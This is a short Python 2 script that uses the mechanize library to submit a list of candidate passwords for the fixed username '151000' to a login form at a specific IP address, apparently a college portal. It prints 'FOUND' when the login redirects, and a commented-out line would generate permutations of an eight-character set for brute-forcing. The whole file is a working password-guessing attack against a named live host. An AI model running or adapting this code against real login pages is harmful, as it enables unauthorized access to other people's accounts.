import mechanize, itertools

combos =["abc","jkhgkgk","MIBLI"]
br=mechanize.Browser()
url="http://210.212.227.210/tkmce/"
br.open(url)
f=0
for i in combos:
    print(i)
    br.select_form(nr=0)
    x=''.join(i)
    br.form['txtUserName']='151000'
    br.form['txtPassword']=x
    br.method="POST"
    print(x)
    response=br.submit()
    
    if response.geturl()!=url:
        f=1
        print"FOUND    "+x
        break
if f==0:
    print "NOT FOUND"






#combos = itertools.permutations("i3^4hUP-",8)
